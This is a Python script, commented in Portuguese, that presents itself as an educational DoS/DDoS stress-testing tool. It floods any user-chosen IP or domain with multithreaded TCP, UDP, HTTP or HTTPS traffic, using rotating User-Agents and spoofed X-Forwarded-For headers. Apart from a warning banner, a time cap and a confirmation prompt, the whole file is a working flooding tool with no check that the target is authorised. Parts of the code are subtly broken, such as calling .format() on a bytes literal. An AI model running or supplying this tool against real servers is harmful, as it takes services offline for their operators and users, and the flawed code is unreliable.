#!/usr/bin/env python3
"""
Ferramenta Educacional de Teste de Estresse (DoS/DDoS)
Uso exclusivo em ambientes controlados e autorizados.
Código comentado para fins didáticos.
"""

import socket
import threading
import random
import ssl
import time
import logging
from datetime import datetime
import sys

# =============================================================================
# CONFIGURAÇÕES DE SEGURANÇA E LIMITES
# =============================================================================
DURACAO_MAXIMA = 240          # segundos (4 minutos) - limite ético
MAX_THREADS = 5000              # limite para evitar abuso
PORTA_PADRAO = 8080              # porta comum para testes

# Configuração de logging
logging.basicConfig(
    filename='stress_test.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Lista de User-Agents para ataques HTTP/HTTPS (simula diversidade de navegadores)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
]

# =============================================================================
# FUNÇÕES AUXILIARES (GERAÇÃO DE CABEÇALHOS, IP FALSO, RESOLUÇÃO DE DOMÍNIO)
# =============================================================================
def gerar_ip_falso():
    """Gera um IP aleatório para cabeçalhos X-Forwarded-For."""
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def criar_cabecalhos_http(host):
    """
    Cria cabeçalhos HTTP GET com User-Agent aleatório e IP falso.
    Retorna bytes prontos para envio via socket.
    """
    user_agent = random.choice(USER_AGENTS)
    ip_falso = gerar_ip_falso()
    cabecalhos = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"X-Forwarded-For: {ip_falso}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    return cabecalhos.encode('ascii')

def resolver_dominio(dominio):
    """Resolve um nome de domínio para endereço IP."""
    try:
        ip = socket.gethostbyname(dominio)
        print(f"[+] Domínio {dominio} resolvido para {ip}")
        return ip
    except socket.gaierror:
        print("[!] Erro: domínio não pôde ser resolvido.")
        return None

# =============================================================================
# FUNÇÕES DE ATAQUE (CADA TIPO EM UMA FUNÇÃO)
# =============================================================================
def ataque_tcp(ip, porta, timeout, stats):
    """
    Ataque TCP: abre conexão e envia dados.
    stats é um dicionário compartilhado para contagem de requisições.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((ip, porta))
            # Envia uma requisição HTTP genérica (pode ser qualquer dado)
            sock.send(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip).encode())
            # Incrementa contador de requisições com segurança (lock)
            with stats['lock']:
                stats['enviados'] += 1
            logging.info(f"TCP ataque bem-sucedido para {ip}:{porta}")
    except Exception as e:
        logging.debug(f"TCP falha: {e}")

def ataque_udp(ip, porta, stats):
    """
    Ataque UDP: envia pacotes aleatórios.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            pacote = random._urandom(1024)  # 1024 bytes aleatórios
            sock.sendto(pacote, (ip, porta))
            with stats['lock']:
                stats['enviados'] += 1
            logging.info(f"UDP pacote enviado para {ip}:{porta}")
    except Exception as e:
        logging.debug(f"UDP falha: {e}")

def ataque_http(ip, porta, timeout, stats):
    """
    Ataque HTTP: envia requisição GET com cabeçalhos falsos.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((ip, porta))
            cabecalhos = criar_cabecalhos_http(ip)
            sock.send(cabecalhos)
            with stats['lock']:
                stats['enviados'] += 1
            logging.info(f"HTTP requisição enviada para {ip}:{porta}")
    except Exception as e:
        logging.debug(f"HTTP falha: {e}")

def ataque_https(ip, porta, timeout, stats):
    """
    Ataque HTTPS: estabelece conexão TLS e envia requisição.
    """
    try:
        contexto = ssl.create_default_context()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            with contexto.wrap_socket(sock, server_hostname=ip) as ssock:
                ssock.connect((ip, porta))
                cabecalhos = criar_cabecalhos_http(ip)
                ssock.send(cabecalhos)
                with stats['lock']:
                    stats['enviados'] += 1
                logging.info(f"HTTPS requisição enviada para {ip}:{porta}")
    except Exception as e:
        logging.debug(f"HTTPS falha: {e}")

# =============================================================================
# FUNÇÃO TRABALHADORA (EXECUTADA POR CADA THREAD)
# =============================================================================
def worker(ip, porta, tipo, timeout, repeticoes, stats, stop_event):
    """
    Cada thread executa repetições do ataque escolhido até atingir o número
    de repetições ou até receber sinal de parada (stop_event).
    """
    # Mapeia tipo para função de ataque correspondente
    ataques = {
        'tcp': ataque_tcp,
        'udp': ataque_udp,
        'http': ataque_http,
        'https': ataque_https
    }
    ataque_func = ataques.get(tipo)
    if not ataque_func:
        return

    for _ in range(repeticoes):
        # Verifica se deve parar (tempo esgotou ou Ctrl+C)
        if stop_event.is_set():
            break
        # Executa o ataque
        if tipo == 'udp':
            ataque_func(ip, porta, stats)
        else:
            ataque_func(ip, porta, timeout, stats)
        # Pequena pausa para evitar consumo excessivo de CPU
        time.sleep(0.001)

# =============================================================================
# FUNÇÃO DE ESTATÍSTICAS EM TEMPO REAL (EXECUTADA EM THREAD SEPARADA)
# =============================================================================
def exibir_estatisticas(stats, duracao, stop_event):
    """
    A cada 2 segundos, exibe o total de requisições, taxa e tempo restante.
    """
    inicio = time.time()
    while not stop_event.is_set():
        tempo_passado = time.time() - inicio
        if tempo_passado >= duracao:
            break
        with stats['lock']:
            enviados = stats['enviados']
        # Calcula taxa média (req/s)
        taxa = enviados / tempo_passado if tempo_passado > 0 else 0
        tempo_restante = duracao - tempo_passado
        # Exibe na mesma linha (sobrescreve)
        sys.stdout.write(f"\r[+] Enviados: {enviados} req | Taxa: {taxa:.1f} req/s | Tempo restante: {tempo_restante:.1f}s   ")
        sys.stdout.flush()
        time.sleep(2)
    # Ao final, exibe uma última vez com quebra de linha
    with stats['lock']:
        enviados = stats['enviados']
    tempo_passado = time.time() - inicio
    taxa = enviados / tempo_passado if tempo_passado > 0 else 0
    sys.stdout.write(f"\r[+] Enviados: {enviados} req | Taxa: {taxa:.1f} req/s | Tempo restante: 0.0s   \n")

# =============================================================================
# FUNÇÃO PRINCIPAL (INTERAÇÃO COM USUÁRIO E CONTROLE DO TESTE)
# =============================================================================
def main():
    print("=" * 50)
    print("   Ferramenta Educacional de Teste de Estresse (DoS/DDoS)")
    print("=" * 50)
    print("⚠️  USO ÉTICO E LEGAL: apenas em servidores próprios ou com autorização!")
    print("=" * 50)

    # -------------------------------------------------------------------------
    # Entrada de dados com validações simples
    # -------------------------------------------------------------------------
    alvo = input("IP ou domínio alvo: ").strip()
    if not alvo:
        print("[!] Alvo inválido.")
        return

    # Se não for IP (contém letras), tenta resolver
    if not alvo.replace('.', '').isdigit():
        ip = resolver_dominio(alvo)
        if not ip:
            return
    else:
        ip = alvo

    # Porta
    try:
        porta = int(input("Porta (padrão 80): ").strip() or "80")
        if porta < 1 or porta > 65535:
            print("[!] Porta inválida.")
            return
    except ValueError:
        print("[!] Porta deve ser um número.")
        return

    # Tipo de ataque
    tipo = input("Tipo de ataque (tcp/udp/http/https): ").strip().lower()
    if tipo not in ['tcp', 'udp', 'http', 'https']:
        print("[!] Tipo inválido.")
        return

    # Número de threads (com limite)
    try:
        num_threads = int(input(f"Número de threads (max {MAX_THREADS}): ").strip())
        if num_threads < 1 or num_threads > MAX_THREADS:
            print(f"[!] Número de threads deve estar entre 1 e {MAX_THREADS}.")
            return
    except ValueError:
        print("[!] Valor inválido.")
        return

    # Timeout
    try:
        timeout = float(input("Timeout por conexão (segundos, ex: 2.0): ").strip())
        if timeout <= 0:
            print("[!] Timeout deve ser positivo.")
            return
    except ValueError:
        print("[!] Timeout inválido.")
        return

    # Duração total (com limite)
    try:
        duracao = float(input(f"Duração total do teste (segundos, max {DURACAO_MAXIMA}): ").strip())
        if duracao <= 0 or duracao > DURACAO_MAXIMA:
            print(f"[!] Duração deve estar entre 1 e {DURACAO_MAXIMA} segundos.")
            return
    except ValueError:
        print("[!] Duração inválida.")
        return

    # Repetições por thread
    try:
        repeticoes_por_thread = int(input("Repetições por thread: ").strip())
        if repeticoes_por_thread < 1:
            print("[!] Repetições deve ser pelo menos 1.")
            return
    except ValueError:
        print("[!] Repetições inválidas.")
        return

    # -------------------------------------------------------------------------
    # Confirmação final
    # -------------------------------------------------------------------------
    print("\n" + "-" * 50)
    print("Resumo do teste:")
    print(f"  Alvo: {ip}:{porta} ({alvo})")
    print(f"  Tipo: {tipo.upper()}")
    print(f"  Threads: {num_threads}")
    print(f"  Timeout: {timeout}s")
    print(f"  Duração: {duracao}s")
    print(f"  Repetições por thread: {repeticoes_por_thread}")
    print("-" * 50)
    confirm = input("Confirmar início do teste? (s/N): ").strip().lower()
    if confirm != 's':
        print("[!] Teste cancelado.")
        return

    # -------------------------------------------------------------------------
    # Preparação para o teste
    # -------------------------------------------------------------------------
    # Dicionário compartilhado para estatísticas (com lock)
    stats = {'enviados': 0, 'lock': threading.Lock()}
    # Evento para sinalizar parada (tempo esgotado ou Ctrl+C)
    stop_event = threading.Event()

    # Inicia thread de estatísticas
    stats_thread = threading.Thread(
        target=exibir_estatisticas,
        args=(stats, duracao, stop_event),
        daemon=True
    )
    stats_thread.start()

    # Inicia threads de ataque
    threads = []
    inicio_teste = time.time()

    print(f"\n[+] Iniciando teste contra {ip}:{porta} com {num_threads} threads...")
    print("[+] Pressione Ctrl+C para interromper.\n")

    try:
        for i in range(num_threads):
            t = threading.Thread(
                target=worker,
                args=(ip, porta, tipo, timeout, repeticoes_por_thread, stats, stop_event),
                daemon=True
            )
            t.start()
            threads.append(t)

        # Aguarda até que o tempo de duração se esgote
        # Como as threads são daemon, o programa pode terminar antes delas se não usarmos join com timeout
        # Vamos usar um loop aguardando o tempo ou interrupção
        while time.time() - inicio_teste < duracao and not stop_event.is_set():
            time.sleep(0.5)

        # Sinaliza parada para todas as threads
        stop_event.set()

        # Aguarda as threads de ataque terminarem (com timeout para não travar)
        for t in threads:
            t.join(timeout=2)

    except KeyboardInterrupt:
        print("\n\n[!] Teste interrompido pelo usuário.")
        stop_event.set()
        # Aguarda threads finalizarem
        for t in threads:
            t.join(timeout=2)

    fim_teste = time.time()
    tempo_total = fim_teste - inicio_teste

    # -------------------------------------------------------------------------
    # Resumo final
    # -------------------------------------------------------------------------
    with stats['lock']:
        total_enviados = stats['enviados']
    print(f"\n[+] Teste concluído em {tempo_total:.2f} segundos.")
    print(f"[+] Total de requisições/pacotes enviados: {total_enviados}")
    print(f"[+] Taxa média: {total_enviados/tempo_total:.2f} req/s")
    print("[+] Logs salvos em stress_test.log")

if __name__ == "__main__":
    main()
